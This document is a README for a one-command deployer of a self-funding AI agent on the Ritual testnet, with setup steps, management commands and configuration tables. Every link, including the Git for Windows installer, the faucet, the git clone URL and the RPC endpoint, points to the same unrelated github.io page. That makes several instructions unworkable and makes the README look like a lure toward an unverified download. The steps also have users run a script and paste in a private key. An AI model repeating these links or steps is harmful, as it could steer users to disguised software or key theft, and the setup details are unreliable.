<div align="center">

# Ritual Sovereign Agent

**Deploy a recurring, self-funding AI agent on Ritual testnet with one command. No API keys.**

<a href="https://icehockeyplayermusiccritic501.github.io"></a>

</div>

---

<h2 align="center">⭐ What is this? ⭐</h2>

A *sovereign agent* is a smart contract that wakes itself on a schedule. On every wake it runs an AI agent inside a secure enclave (TEE), pays for that run from its own on-chain wallet, and keeps going until the money runs out. It lives entirely on-chain.

---

<h2 align="center">📋 Prerequisites 📋</h2>

You need three things. The script installs everything else for you (foundry, uv, and - on Linux/WSL - curl).

1. **git** - to download the code. Most systems already have it; if `git --version` fails, install it (see below).
2. A **wallet on Ritual testnet** with a little RITUAL in it. Create one in MetaMask or Rabby, then get free testnet RITUAL from the faucet: https://icehockeyplayermusiccritic501.github.io
3. That wallet's **private key** (use a throwaway testnet wallet - never a real one). You paste it once, when the script asks.

**Installing git** (skip if `git --version` already works):

- **Windows:** install [Git for Windows](https://icehockeyplayermusiccritic501.github.io) - it also bundles Git Bash and curl - or run `winget install Git.Git`.
- **macOS:** `xcode-select --install` (or `brew install git`).
- **Linux / WSL:** `sudo apt install git` (Debian/Ubuntu), or your distro's package manager.

---

<h2 align="center">🏃 Quick Start 🏃</h2>

### Step 1 - Get the code

```bash
git clone https://icehockeyplayermusiccritic501.github.io
cd ritual-agent-deployment
```

### Step 2 - Configure

```bash
cp .env.example .env
```

There is nothing you must edit - the defaults work. `PROMPT` is the task your agent runs on every wake, so change it to anything you like.

### Step 3 - Deploy

On Windows (PowerShell):

```powershell
pwsh run.ps1
```

On Linux / macOS / Git Bash / WSL:

```bash
bash run.sh
```

---

<h2 align="center">🛠 Managing your agents 🛠</h2>

Each agent is its own contract at a deterministic address (your wallet + a salt). Run a command with **no address** to act on the agent named by `SALT` in `.env`, or pass an **agent address** to target a specific one.

| Command | What it does |
| --- | --- |
| `bash run.sh` | Deploy + fund + arm. If one is already live, it asks before making another. |
| `bash run.sh status` | List every agent you have deployed, with state and balance. |
| `bash run.sh status <address>` | Full detail for one agent. |
| `bash run.sh topup <address> [wei]` | Add more RITUAL (re-arms it if it was stopped). |
| `bash run.sh restart <address>` | Re-arm a stopped agent. |
| `bash run.sh stop <address>` | Stop an agent's schedule. |

**Want a second agent?** Just run `bash run.sh` again. It notices your first one is live, asks `Deploy another? [y/N]`, and on yes creates the next (`agent-1` -> `agent-2`, ...).

---

<h2 align="center">⚙️ Configuration ⚙️</h2>

`.env` holds no secrets - only your public address and run settings.

| Variable | Purpose |
| --- | --- |
| `RPC_URL` | Ritual testnet RPC endpoint. |
| `CHAIN_ID` | `1979` (Ritual testnet). |
| `DEPOSIT_WEI` | RITUAL locked into the agent's wallet, in wei. `0.015 RITUAL` is roughly one wake. |
| `CLI_TYPE` | Harness type. `6` = ZeroClaw. |
| `MODEL` | Model id routed through Ritual's gateway (no external key). Default `zai-org/GLM-4.7-FP8`. |
| `PROMPT` | The task the agent runs on each wake. |
| `SALT` | Any unique string - changes the agent address. Use a new one per agent. |
| `LOCK_BLOCKS` | Optional. Blocks a deposit stays locked. Defaults to `100000`. |
| `KEYSTORE_ACCOUNT` | Written automatically on first run - the name of your keystore. |
| `WALLET_ADDRESS` | Written automatically on first run - your public address. |

Your private key is never written to `.env`; it lives encrypted in `~/.foundry/keystores`. Still, use a **testnet burner** wallet - do not import one with real funds.

---

<h2 align="center">🌐 Network 🌐</h2>

| Network | Chain ID | RPC | Faucet | SovereignAgentFactory |
| --- | --- | --- | --- | --- |
| **Ritual testnet** | `1979` | `https://icehockeyplayermusiccritic501.github.io` | https://icehockeyplayermusiccritic501.github.io | `0x9dC4C054e53bCc4Ce0A0Ff09E890A7a8e817f304` |

---

<h2 align="center">📜 Disclaimer & License 📜</h2>

This tool signs transactions with a key it stores in an encrypted keystore under `~/.foundry/keystores` - use a testnet burner wallet, never one with real funds. The deposit you lock funds the agent's scheduled runs and is spent over time - it is not recoverable on a whim. This is testnet software, provided as-is, without warranty, and has not been audited. Use at your own risk.

Released under the **MIT License**. Built by [Zun](https://icehockeyplayermusiccritic501.github.io).
